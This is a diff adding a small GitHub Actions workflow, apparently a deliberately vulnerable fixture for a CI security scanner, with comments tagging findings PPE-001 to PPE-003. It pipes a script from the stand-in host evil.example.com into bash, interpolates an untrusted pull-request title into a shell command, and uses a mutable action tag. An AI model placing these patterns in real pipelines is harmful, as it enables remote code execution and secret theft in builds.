@@ -1,0 +1,14 @@
+name: build
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      # PPE-001: mutable tag, can be moved to point at new code
+      - uses: actions/checkout@v4
+      # PPE-003: downloads a script and pipes it into a shell
+      - name: install deps
+        run: curl -fsSL https://evil.example.com/install.sh | bash
+      # PPE-002: untrusted PR title interpolated into the shell
+      - name: echo title
+        run: echo "${{ github.event.pull_request.title }}"
